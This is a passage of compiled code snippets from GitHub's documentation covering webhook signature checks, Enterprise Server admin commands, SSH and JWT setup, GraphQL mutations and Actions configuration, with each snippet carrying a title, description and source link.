admin@HOSTNAME:/home/admin\n```\n\n----------------------------------------\n\nTITLE: Signature Validation in Go\nDESCRIPTION: This Go code snippet demonstrates how to validate a Github webhook signature. It fetches public keys from the Github API, identifies the correct key based on the `Github-Public-Key-Identifier` header, and verifies the signature against the payload using the `ECDSA-NIST-P256V1-SHA256` algorithm. It requires the `GITHUB_PRODUCTION_TOKEN` environment variable to be set to avoid rate limiting when fetching the public keys.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_2\n\nLANGUAGE: golang\nCODE:\n```\npackage main\n\nimport (\n  \"crypto/ecdsa\"\n  \"crypto/sha256\"\n  \"crypto/x509\"\n  \"encoding/asn1\"\n  \"encoding/base64\"\n  \"encoding/json\"\n  \"encoding/pem\"\n  \"errors\"\n  \"fmt\"\n  \"math/big\"\n  \"net/http\"\n  \"os\"\n)\n\nfunc main() {\n  payload := `[{\"source\":\"commit\",\"token\":\"some_token\",\"type\":\"some_type\",\"url\":\"https://example.com/base-repo-url/\"}]`\n\n  kID := \"bcb53661c06b4728e59d897fb6165d5c9cda0fd9cdf9d09ead458168deb7518c\"\n\n  kSig := \"MEQCIQDaMKqrGnE27S0kgMrEK0eYBmyG0LeZismAEz/BgZyt7AIfXt9fErtRS4XaeSt/AO1RtBY66YcAdjxji410VQV4xg==\"\n\n  // Fetch the list of GitHub Public Keys\n  req, err := http.NewRequest(\"GET\", \"https://api.github.com/meta/public_keys/secret_scanning\", nil)\n  if err != nil {\n    fmt.Printf(\"Error preparing request: %s\\n\", err)\n    os.Exit(1)\n  }\n\n  if len(os.Getenv(\"GITHUB_PRODUCTION_TOKEN\")) == 0 {\n    fmt.Println(\"Need to define environment variable GITHUB_PRODUCTION_TOKEN\")\n    os.Exit(1)\n  }\n\n  req.Header.Add(\"Authorization\", \"Bearer \"+os.Getenv(\"GITHUB_PRODUCTION_TOKEN\"))\n\n  resp, err := http.DefaultClient.Do(req)\n  if err != nil {\n    fmt.Printf(\"Error requesting GitHub signing keys: %s\\n\", err)\n    os.Exit(2)\n  }\n\n  decoder := json.NewDecoder(resp.Body)\n  var keys GitHubSigningKeys\n  if err := decoder.Decode(&keys); err != nil {\n    fmt.Printf(\"Error decoding GitHub signing key request: %s\\n\", err)\n    os.Exit(3)\n  }\n\n  // Find the Key used to sign our webhook\n  pubKey, err := func() (string, error) {\n    for _, v := range keys.PublicKeys {\n      if v.KeyIdentifier == kID {\n        return v.Key, nil\n\n      }\n    }\n    return \"\", errors.New(\"specified key was not found in GitHub key list\")\n  }()\n\n  if err != nil {\n    fmt.Printf(\"Error finding GitHub signing key: %s\\n\", err)\n    os.Exit(4)\n  }\n\n  // Decode the Public Key\n  block, _ := pem.Decode([]byte(pubKey))\n  if block == nil {\n    fmt.Println(\"Error parsing PEM block with GitHub public key\")\n    os.Exit(5)\n  }\n\n  // Create our ECDSA Public Key\n  key, err := x509.ParsePKIXPublicKey(block.Bytes)\n  if err != nil {\n    fmt.Printf(\"Error parsing DER encoded public key: %s\\n\", err)\n    os.Exit(6)\n  }\n\n  // Because of documentation, we know it's a *ecdsa.PublicKey\n  ecdsaKey, ok := key.(*ecdsa.PublicKey)\n  if !ok {\n    fmt.Println(\"GitHub key was not ECDSA, what are they doing?!\")\n    os.Exit(7)\n  }\n\n  // Parse the Webhook Signature\n  parsedSig := asn1Signature{}\n  asnSig, err := base64.StdEncoding.DecodeString(kSig)\n  if err != nil {\n    fmt.Printf(\"unable to base64 decode signature: %s\\n\", err)\n    os.Exit(8)\n  }\n  rest, err := asn1.Unmarshal(asnSig, &parsedSig)\n  if err != nil || len(rest) != 0 {\n    fmt.Printf(\"Error unmarshalling asn.1 signature: %s\\n\", err)\n    os.Exit(9)\n  }\n\n  // Verify the SHA256 encoded payload against the signature with GitHub's Key\n  digest := sha256.Sum256([]byte(payload))\n  keyOk := ecdsa.Verify(ecdsaKey, digest[:], parsedSig.R, parsedSig.S)\n\n  if keyOk {\n    fmt.Println(\"THE PAYLOAD IS GOOD!!\")\n  } else {\n    fmt.Println(\"the payload is invalid :(\")\n    os.Exit(10)\n  }\n}\n\ntype GitHubSigningKeys struct {\n  PublicKeys []struct {\n    KeyIdentifier string `json:\"key_identifier\"`\n    Key           string `json:\"key\"`\n    IsCurrent     bool   `json:\"is_current\"`\n  } `json:\"public_keys\"`\n}\n\n// asn1Signature is a struct for ASN.1 serializing/parsing signatures.\ntype asn1Signature struct {\n  R *big.Int\n  S *big.Int\n}\n\n```\n\n----------------------------------------\n\nTITLE: Disabling MinIO via SSH Shell\nDESCRIPTION: This command disables the internal MinIO service for GitHub Advanced Security on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.minio.enabled` configuration option to `false`.  Disabling the service does not affect MinIO storage for GitHub Actions or the GitHub Packages registry. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.minio.enabled false\n```\n\n----------------------------------------\n\nTITLE: Forcing Log Rotation\nDESCRIPTION: This command forces the rotation of logs using `logrotate`, based on the configuration file `/etc/logrotate.conf`. It ensures that old log files are archived and new ones are created, preventing excessive disk usage by log files.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nsudo logrotate -f /etc/logrotate.conf\n```\n\n----------------------------------------\n\nTITLE: Handling API Rate Limits with Retry Logic (Python)\nDESCRIPTION: This Python code demonstrates how to handle API rate limits using a retry mechanism with exponential backoff. It uses the `requests` library, along with `HTTPAdapter` and `Retry` from `urllib3`, to automatically retry requests that fail due to specific status codes (500, 502, 504). The `backoff_factor` gradually increases the delay between retries.  It depends on the `requests` and `flask` libraries.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/debugging-errors/handling-api-rate-limits.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport requests\nfrom flask import Flask, request\nfrom requests.adapters import HTTPAdapter\nfrom requests.packages.urllib3.util.retry import Retry\n\napp = Flask(__name__)\n\nWEATHER_API_URL = \"https://api.example.com/weather\"\n\ndef requests_retry_session(\n    retries=3,\n    backoff_factor=0.3,\n    status_forcelist=(500, 502, 504),\n    session=None,\n):\n    session = session or requests.Session()\n    retry = Retry(\n        total=retries,\n        read=retries,\n        connect=retries,\n        backoff_factor=backoff_factor,\n        status_forcelist=status_forcelist,\n    )\n    adapter = HTTPAdapter(max_retries=retry)\n    session.mount(\"http://\", adapter)\n    session.mount(\"https://\", adapter)\n    return session\n\n@app.route('/get_weather', methods=['GET'])\ndef get_weather():\n    city = request.args.get('city')\n    try:\n        response = requests_retry_session().get(WEATHER_API_URL, params={\"city\": city})\n        response.raise_for_status()\n        weather_data = response.json()\n    except requests.exceptions.RequestException as e:\n        return {\"error\": str(e)}, 500\n\n    return weather_data\n```\n\n----------------------------------------\n\nTITLE: Configuring Bundled Actions Organization (Shell)\nDESCRIPTION: These snippets demonstrate how to configure the organization that will store the official bundled actions and workflow templates for GitHub Actions on GitHub Enterprise Server. It involves setting two `ghe-config` parameters to the designated organization, and unsetting the SHA for bundled actions. The configuration change requires applying the new settings for it to take effect.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/advanced-configuration-and-troubleshooting/troubleshooting-github-actions-for-your-enterprise.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.actions.actions-org ORGANIZATION\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.actions.github-org ORGANIZATION\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-config --unset 'app.actions.actions-repos-sha1sum'\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent and Adding Specific Key\nDESCRIPTION: Starts the SSH agent in the background and adds a specific SSH key (e.g., `~/.ssh/my_other_key`) to the agent. It prompts for the passphrase if the key is encrypted.  The `eval \"$(ssh-agent -s)\"` command is used to properly initialize the SSH agent environment variables. The `ssh-add ~/.ssh/my_other_key` command adds the specified key to the agent.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-agent-admitted-failure-to-sign.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n# start the ssh-agent in the background\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n$ ssh-add ~/.ssh/my_other_key\n> Enter passphrase for /home/YOU/.ssh/my_other_key: [tappity tap tap]\n> Identity added: /home/YOU/.ssh/my_other_key (/home/YOU/.ssh/my_other_key)\n```\n\n----------------------------------------\n\nTITLE: Listing Azure VMs - Shell\nDESCRIPTION: This command lists the virtual machines within a specified resource group in Azure. It displays details such as name, resource group, power state, public IPs, FQDNs, location, and zones in a tabular format. The `az vm list` command is used to retrieve and present the VM information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-azure.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ az vm list -d -g RESOURCE_GROUP -o table\n```\n\n----------------------------------------\n\nTITLE: JSONP Callback Request Example\nDESCRIPTION: This curl command demonstrates a JSONP request by adding the `callback` parameter to the GitHub REST API endpoint. The response is a JavaScript function call wrapping the JSON data. This allows cross-domain requests by bypassing the same-origin policy.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-cors-and-jsonp-to-make-cross-origin-requests.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ curl {% data variables.product.rest_url %}?callback=foo\n\n> /**/foo({\n>   \"meta\": {\n>     \"status\": 200,\n>     \"x-ratelimit-limit\": \"5000\",\n>     \"x-ratelimit-remaining\": \"4966\",\n>     \"x-ratelimit-reset\": \"1372700873\",\n>     \"Link\": [ // pagination headers and other links\n>       [\"{% data variables.product.rest_url %}?page=2\", {\"rel\": \"next\"}]\n>     ]\n>   },\n>   \"data\": {\n>     // the data\n>   }\n> })\n```\n\n----------------------------------------\n\nTITLE: Setting a warning message in PowerShell\nDESCRIPTION: This snippet shows how to set a warning message using the `warning` workflow command in PowerShell. It is similar to the Bash example, including file, line, column, and title parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_10\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::warning file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\"\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting Repository Not Found - Shell\nDESCRIPTION: This snippet demonstrates the error message when the repository you are trying to clone cannot be found due to permission issues, deletion, or renaming.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nfatal: repository 'https://github.com/<user>/<repo>.git' not found\n\n(The error was parsed as 8: The repository does not seem to exist anymore. You may not have access, or it may have been deleted or renamed.)\n```\n\n----------------------------------------\n\nTITLE: CodeQL Resolve Queries Command\nDESCRIPTION: This command expands query directories and suite specifications to a list of individual .ql files to execute. It supports specifying queries, directories, suites, and packs with an optional scope, range, and path. It can output in text, JSON, or bylanguage format.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-queries.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve queries <options>... -- <query|dir|suite|pack>...\n```\n\n----------------------------------------\n\nTITLE: GraphQL Mutation with Variables for AddReaction\nDESCRIPTION: This example shows how to use variables within a GraphQL mutation to add a reaction to an issue.  It defines a mutation with an input variable of type AddReactionInput and passes the subjectId and content through the variables section in JSON format.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_7\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation($myVar:AddReactionInput!) {\n  addReaction(input:$myVar) {\n    reaction {\n      content\n    }\n    subject {\n      id\n    }\n  }\n}\nvariables {\n  \"myVar\": {\n    \"subjectId\":\"MDU6SXNzdWUyMTc5NTQ0OTc=\",\n    \"content\":\"HOORAY\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rewriting authors and branches after Subversion import (Shell)\nDESCRIPTION: This command rewrites the authors and branches of the imported Subversion repository using a CSV file. It requires the path to the authors map file and the path to the temporary repository. Replace `/PATH/AUTHORS-MAP-FILE.csv` and `/PATH/REPO-NAME.git` with the actual file and repository paths.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngit-import-rewrite --flavor svn --authors /PATH/AUTHORS-MAP-FILE.csv /PATH/REPO-NAME.git\n```\n\n----------------------------------------\n\nTITLE: Avoiding Sequential Conditional Checks in Python\nDESCRIPTION: This Python code prints the sound an animal makes using a series of `if...else` statements. Copilot Chat is used to refactor the code to use a dictionary to map animal types to their sounds, avoiding the inefficient and cumbersome `if...else` chain.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/improving-code-readability-and-maintainability.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nclass Animal:\n    def speak(self):\n        pass\n\nclass Dog(Animal):\n    def speak(self):\n        return \"Woof!\"\n\nclass Cat(Animal):\n    def speak(self):\n        return \"Meow!\"\n\nclass Bird(Animal):\n    def speak(self):\n        return \"Tweet!\"\n\ndef animal_sound(animal_type):\n    if animal_type == \"dog\":\n        return Dog().speak()\n    elif animal_type == \"cat\":\n        return Cat().speak()\n    elif animal_type == \"bird\":\n        return Bird().speak()\n    else:\n        return \"Unknown animal\"\n\nprint(animal_sound(\"dog\"))\nprint(animal_sound(\"cat\"))\nprint(animal_sound(\"bird\"))\nprint(animal_sound(\"fish\"))\n```\n\nLANGUAGE: python\nCODE:\n```\nclass Animal:\n    def speak(self):\n        pass\n\nclass Dog(Animal):\n    def speak(self):\n        return \"Woof!\"\n\nclass Cat(Animal):\n    def speak(self):\n        return \"Meow!\"\n\nclass Bird(Animal):\n    def speak(self):\n        return \"Tweet!\"\n\ndef animal_sound(animal_type):\n    animals = {\n        \"dog\": Dog,\n        \"cat\": Cat,\n        \"bird\": Bird\n    }\n    animal_class = animals.get(animal_type, Animal)\n    return animal_class().speak() if animal_class != Animal else \"Unknown animal\"\n\nprint(animal_sound(\"dog\"))\nprint(animal_sound(\"cat\"))\nprint(animal_sound(\"bird\"))\nprint(animal_sound(\"fish\"))\n```\n\n----------------------------------------\n\nTITLE: Axe Result Example: Description, Help, HelpUrl, ID, Impact - Shell\nDESCRIPTION: This code snippet showcases example results from the Axe test suite, highlighting key fields like 'description' (explains the rule that returned an error), 'help' (explains the expected result), 'helpUrl' (links to Deque University for more information), 'id' (rule identifier), and 'impact' (the severity of the issue). This aids in understanding how to interpret accessibility test failures detected by Axe.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/axe.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# Example 1\n    +     \"description\": \"Ensures table headers have discernible text\",\n    +     \"help\": \"Table header text should not be empty\",\n    +     \"helpUrl\": \"https://dequeuniversity.com/rules/axe/4.7/empty-table-header?application=playwright\",\n    +     \"id\": \"empty-table-header\",\n    +     \"impact\": \"minor\",\n\n# Example 2\n    +     \"description\": \"Ensures that lists are structured correctly\",\n    +     \"help\": \"<ul> and <ol> must only directly contain <li>, <script> or <template> elements\",\n    +     \"helpUrl\": \"https://dequeuniversity.com/rules/axe/4.7/list?application=playwright\",\n    +     \"id\": \"list\",\n    +     \"impact\": \"serious\"\n```\n\n----------------------------------------\n\nTITLE: Creating Manifest Registration Form (Personal Account) - HTML\nDESCRIPTION: This HTML snippet creates a form that sends a POST request to GitHub to register a new GitHub App from a manifest for a personal account. It includes an input field for the manifest JSON and a submit button.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<form action=\"https://github.com/settings/apps/new?state=abc123\" method=\"post\">\n Register a GitHub App Manifest: <input type=\"text\" name=\"manifest\" id=\"manifest\"><br>\n <input type=\"submit\" value=\"Submit\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Analyzing CodeQL database with threat model configuration\nDESCRIPTION: This command analyzes a CodeQL database, specifying the format as sarif-latest, setting the threat model to 'local', outputting the results to a specified file, and using a standard query pack. It utilizes the 'local' threat model, considering data from local sources as potentially tainted.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ codeql database analyze /codeql-dbs/my-company --format=sarif-latest \\\n  --threat-model=local \\\n  --output=/temp/my-company.sarif codeql/java-queries\n```\n\n----------------------------------------\n\nTITLE: Checking node status using nomad node status\nDESCRIPTION: This snippet shows how to check the status of a node using the `nomad node status` command.  It confirms that the node's status is `ready` before re-enabling it.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\nnomad node status\n```\n\n----------------------------------------\n\nTITLE: Finding SSH Key Usage\nDESCRIPTION: This command uses `ssh` to connect to GitHub using a specific SSH key provided by the `-i` flag. The `-T` flag disables pseudo-terminal allocation and allows for authentication. The response indicates the GitHub account or repository where the key is currently in use.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-key-already-in-use.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh -T -ai ~/.ssh/id_rsa git@{% data variables.product.product_url %}\n# Connect to {% data variables.location.product_location %} using a specific ssh key\n> Hi USERNAME! You've successfully authenticated, but GitHub does not\n> provide shell access.\n```\n\n----------------------------------------\n\nTITLE: Stopping Runner Service - Windows\nDESCRIPTION: Stops the self-hosted runner service on Windows using PowerShell. Requires the `actions.runner.*` service name, which is stored in the `service_win_name` variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_9\n\nLANGUAGE: powershell\nCODE:\n```\nStop-Service \"{{ service_win_name }}\"\n```\n\n----------------------------------------\n\nTITLE: Example Tool Cache Directory Structure\nDESCRIPTION: Demonstrates the expected directory structure of the tool cache after extracting the artifact on the self-hosted runner. It shows the 'node' directory containing version-specific subdirectories. This structure is essential for the runner to correctly locate and utilize the cached tools.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/setting-up-the-tool-cache-on-self-hosted-runners-without-internet-access.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nRUNNER_DIR\n├── ...\n└── _work\n    ├── ...\n    └── _tool\n        └── node\n            ├── 14.21.3\n            │   └── ...\n            └── 16.16.0\n                └── ...\n```\n\n----------------------------------------\n\nTITLE: Removing a node from a cluster (ghe-remove-node)\nDESCRIPTION: This command removes a node from the GitHub Enterprise Server cluster. It evacuates data from data services running on the node, marks the node as offline, and stops traffic from being routed to it. NODE-HOSTNAME should be replaced with the actual hostname of the node to be removed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-remove-node NODE-HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Successful Email Reply Log\nDESCRIPTION: This text code snippet shows an example log entry from `/var/log/mail.log` indicating a successful email reply. It captures the connection from the client, message ID, sender and recipient information, and confirmation of the message being delivered.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-email-for-notifications.md#_snippet_1\n\nLANGUAGE: Text\nCODE:\n```\nOct 30 00:47:18 54-171-144-1 postfix/smtpd[13210]: connect from st11p06mm-asmtp002.mac.com[17.172.124.250]\nOct 30 00:47:19 54-171-144-1 postfix/smtpd[13210]: 51DC9163323: client=st11p06mm-asmtp002.mac.com[17.172.124.250]\nOct 30 00:47:19 54-171-144-1 postfix/cleanup[13216]: 51DC9163323: message-id=<b2b9c260-4aaa-4a93-acbb-0b2ddda68579@me.com>\nOct 30 00:47:19 54-171-144-1 postfix/qmgr[17250]: 51DC9163323: from=<tcook@icloud.com>, size=5048, nrcpt=1 (queue active)\nOct 30 00:47:19 54-171-144-1 postfix/virtual[13217]: 51DC9163323: to=<reply+i-1-1801beb4df676a79250d1e61e54ab763822c207d-5@reply.ghe.tjl2.co.ie>, relay=virtual, delay=0.12, delays=0.11/0/0/0, dsn=2.0.0, status=sent (delivered to maildir)\nOct 30 00:47:19 54-171-144-1 postfix/qmgr[17250]: 51DC9163323: removed\nOct 30 00:47:19 54-171-144-1 postfix/smtpd[13210]: disconnect from st11p06mm-asmtp002.mac.com[17.172.124.250]\n```\n\n----------------------------------------\n\nTITLE: Generating JWT with Bash\nDESCRIPTION: This Bash script generates a JWT for authenticating with a GitHub App. It takes the App/Client ID and the path to the PEM file as arguments.  It uses `openssl` to sign the header and payload. The script constructs the header and payload as JSON strings, encodes them using base64, calculates the signature, and concatenates the parts to form the JWT.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-json-web-token-jwt-for-a-github-app.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n#!/usr/bin/env bash\n\nset -o pipefail\n{% ifversion client-id-for-app %}\nclient_id=$1 # Client ID as first argument\n{% else %}\napp_id=$1 # App ID as first argument\n{% endif %}\npem=$( cat $2 ) # file path of the private key as second argument\n\nnow=$(date +%s)\niat=$((${now} - 60)) # Issues 60 seconds in the past\nexp=$((${now} + 600)) # Expires 10 minutes in the future\n\nb64enc() { openssl base64 | tr -d '=' | tr '/+' '_-' | tr -d '\\n'; }\n\nheader_json='{\n    \"typ\":\"JWT\",\n    \"alg\":\"RS256\"\n}'\n# Header encode\nheader=$( echo -n \"${header_json}\" | b64enc )\n\npayload_json=\"{\n    \\\"iat\\\":${iat},\n    \\\"exp\\\":${exp},\n    {% ifversion client-id-for-app %}\\\"iss\\\":\\\"${client_id}\\\"{% else %}\\\"iss\\\":\\\"${app_id}\\\"{% endif %}\n}\"\n# Payload encode\npayload=$( echo -n \"${payload_json}\" | b64enc )\n\n# Signature\nheader_payload=\"${header}\".\"${payload}\"\nsignature=$( \\\n    openssl dgst -sha256 -sign <(echo -n \"${pem}\") \\\n    <(echo -n \"${header_payload}\") | b64enc\n)\n\n# Create JWT\nJWT=\"${header_payload}\".\"${signature}\"\nprintf '%s\\n' \"JWT: $JWT\"\n```\n\n----------------------------------------\n\nTITLE: Update Project Item Fields using GraphQL\nDESCRIPTION: Uses the GitHub CLI and GraphQL API to update the fields of a project item. It constructs a GraphQL mutation to set the 'Status' and 'Date posted' fields. It requires the project ID, item ID, field IDs for 'Status' and 'Date posted', the ID of the desired 'Status' option (e.g., 'Todo'), and the date value.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n            mutation (\\n              $project: ID!\\n              $item: ID!\\n              $status_field: ID!\\n              $status_value: String!\\n              $date_field: ID!\\n              $date_value: Date!\\n            ) {\\n              set_status: updateProjectV2ItemFieldValue(input: {\\n                projectId: $project\\n                itemId: $item\\n                fieldId: $status_field\\n                value: {\\n                  singleSelectOptionId: $status_value\\n                  }\\n              }) {\\n                projectV2Item {\\n                  id\\n                  }\\n              }\\n              set_date_posted: updateProjectV2ItemFieldValue(input: {\\n                projectId: $project\\n                itemId: $item\\n                fieldId: $date_field\\n                value: {\\n                  date: $date_value\\n                }\\n              }) {\\n                projectV2Item {\\n                  id\\n                }\\n              }\\n            }' -f project=$PROJECT_ID -f item=$ITEM_ID -f status_field=$STATUS_FIELD_ID -f status_value=${{ env.TODO_OPTION_ID }} -f date_field=$DATE_FIELD_ID -f date_value=$DATE --silent\n```\n\n----------------------------------------\n\nTITLE: Listing Git Remotes - Shell\nDESCRIPTION: Shows how to list all configured git remotes and their corresponding URLs.  The `git remote -v` command displays the remote names and fetch/push URLs for the repository. Requires a git repository to be initialized.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/remove-git-remote.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n# Show existing remotes\n$ git remote -v\n> origin\tgit@git-server/octocat/hello-world.git (fetch)\n> origin\tgit@git-server/octocat/hello-world.git (push)\n```\n\n----------------------------------------\n\nTITLE: Finding GHES Node with Nomad\nDESCRIPTION: This series of commands identifies the node running the 'nes' job within the Nomad cluster. It uses `nomad job status`, `grep`, `awk`, and `xargs` to filter and extract the relevant node information based on the `$nomad_node_id` variable.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_15\n\nLANGUAGE: shell\nCODE:\n```\nnomad job status \"nes\" | grep running | grep \"${nomad_node_id}\" | awk 'NR==2{ print $1 }' | xargs nomad alloc status | grep \"Node Name\"\n```\n\n----------------------------------------\n\nTITLE: Building a Docker image for pre-receive hook testing\nDESCRIPTION: This command builds a Docker image using the `Dockerfile.dev` configuration. The image is tagged as `pre-receive.dev` and used for creating a local testing environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ docker build -f Dockerfile.dev -t pre-receive.dev .\n```\n\n----------------------------------------\n\nTITLE: Configuring Container Job Service - YAML\nDESCRIPTION: This snippet shows the configuration of a service container within a GitHub Actions workflow job. It defines the Redis service using a Docker Hub image and sets health check options to ensure the service is running before the job proceeds. This configuration is part of a larger workflow designed to run a containerized job that depends on a Redis service.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n```\n\n----------------------------------------\n\nTITLE: GitLab Config File (YAML)\nDESCRIPTION: This YAML configuration file specifies the source files to be used for auditing a GitLab instance. Each entry includes the repository slug (namespace/project-name) and the path to the `.gitlab-ci.yml` file. The `repository_slug` must be unique for each entry.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: YAML\nCODE:\n```\nsource_files:\n  - repository_slug: namespace/project-name\n    path: path/to/.gitlab-ci.yml\n  - repository_slug: namespace/some-other-project-name\n    path: path/to/.gitlab-ci.yml\n```\n\n----------------------------------------\n\nTITLE: Interactive Feature Configuration (Shell)\nDESCRIPTION: Shows how to use the `configure --features` command to interactively configure feature flags and automatically write them to your environment.  The example shows the interactive prompts and selections.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure --features\n\n✔ Which features would you like to configure?: actions/cache, reusable-workflows\n✔ actions/cache (disabled): Enable\n? reusable-workflows (disabled):\n› Enable\n  Disable\n```\n\n----------------------------------------\n\nTITLE: Copying the pre-receive hook into the Docker container\nDESCRIPTION: This command copies the `always_reject.sh` script into the `hooks/pre-receive` directory of the `test.git` repository within the Docker container. This makes the script available for execution during Git pushes.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ndocker cp always_reject.sh data:/home/git/test.git/hooks/pre-receive\n```\n\n----------------------------------------\n\nTITLE: Configuring postCreateCommand in devcontainer.json\nDESCRIPTION: This snippet demonstrates how to uncomment and modify the `postCreateCommand` property in `devcontainer.json`. This command is executed after the dev container is created, in this case, creating a file named `TEMP.md` with some content.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-java-project-for-codespaces.md#_snippet_2\n\nLANGUAGE: jsonc\nCODE:\n```\n// Use 'postCreateCommand' to run commands after the container is created.\n   \"postCreateCommand\": \"echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md\",\n```\n\n----------------------------------------\n\nTITLE: Configuring Pub Repository\nDESCRIPTION: This snippet configures access to a private Pub repository using a URL and token. It defines the registry and updates configuration.\nSOURCE: 